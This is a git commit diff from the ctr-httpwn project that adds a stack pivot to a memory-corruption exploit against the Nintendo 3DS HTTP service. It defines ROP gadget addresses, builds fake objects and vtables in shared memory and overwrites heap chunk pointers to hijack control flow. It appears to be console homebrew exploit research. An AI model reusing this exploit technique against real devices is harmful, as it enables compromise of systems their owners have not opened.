197055a0186a7cf9fa596fcdefd65c4033ac4638
yellows8 <yellows8@users.noreply.github.com>
2016-02-13 23:04:33 -0500

    Implemented stack-pivot.

--- source/ctr-httpwn.c
+++ source/ctr-httpwn.c
@@ -91,8 +91,16 @@ void init_hax_sharedmem(u32 *tmpbuf)
 	u32 target_overwrite_addr;
 	u32 object_addr = sharedmembase + 0x200;
 	u32 *initialhaxobj = &tmpbuf[0x200>>2];
+	u32 *haxobj1 = &tmpbuf[0x400>>2];
+	u32 *ropchain = &tmpbuf[0x600>>2];
 
-	target_overwrite_addr = 0x0011d398;//This is the stackframe address for the actual CloseContext function.
+	u32 ROP_LDRR4R5_R5x1b8_OBJVTABLECALLx8 = 0x0010264c;//Load r4 from r5+0x1b8 and r6 from r5+0x1bc. Set r0 to r4. Load the vtable addr + funcptr using just r1 and blx to r1(vtable funcptr +8).
+	u32 ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 = 0x00114b30;//Load ip from r0+0(vtable ptr). Load r1 from r4+0xc, r2 from r4+0x14, and r3 from r4+0x4. Then load ip from ip+0x18(vtable+0x18) and blx to ip.
+	u32 ROP_STACKPIVOT = 0x00107b08;//Add sp with r3 then pop-pc.
+
+	u32 closecontext_stackframe = 0x0011d398;//This is the stackframe address for the actual CloseContext function.
+
+	target_overwrite_addr = closecontext_stackframe;
 	target_overwrite_addr-= 0xc;//Subtract by this value to get the address of the saved r5 which will be popped.
 
 	//Overwrite the prev/next memchunk ptrs in the CTRSDK freemem memchunkhdr following the allocated struct for the POST data.
@@ -104,7 +112,23 @@ void init_hax_sharedmem(u32 *tmpbuf)
 
 	initialhaxobj[0] = object_addr+0x100;//Set the vtable to sharedmem+0x300.
 	initialhaxobj[1] = object_addr+4;//Set obj+4 to the addr of obj+4, so that most of the linked-list code is skipped over.
-	tmpbuf[(0x300+4) >> 2] = 0x44557788;//Set the funcptr @ vtable+4.
+	tmpbuf[(0x300+4) >> 2] = ROP_LDRR4R5_R5x1b8_OBJVTABLECALLx8;//Set the funcptr @ vtable+4. This where the hax initially gets control of PC. Once this ROP finishes it will jump to ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 below.
+
+	initialhaxobj[0x1b8>>2] = object_addr+0x200;//Set the addr of haxobj1 to sharedmem+0x400(this object is used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8).
+
+	haxobj1[0] = sharedmembase+0x500;
+	//Setup the regs loaded by ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18.
+	haxobj1[0xc>>2] = 0;//r1
+	haxobj1[0x14>>2] = 0;//r2
+	haxobj1[0x4>>2] = (sharedmembase+0x600) - closecontext_stackframe;//r3
+
+	//Init the vtable for haxobj1.
+	tmpbuf[(0x500+8) >> 2] = ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18;//Init the funcptr used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8. Once this ROP finishes it will jump to ROP_STACKPIVOT.
+	tmpbuf[(0x500+0x18) >> 2] = ROP_STACKPIVOT;//Stack-pivot to sharedmem+0x600.
+
+	//Setup the actual ROP-chain.
+	ropchain[0x0] = 0x58584148;
+	ropchain[0x4>>2] = 0x40404040;
 }
 
 Result writehax_sharedmem_physmem(u32 *linearaddr)
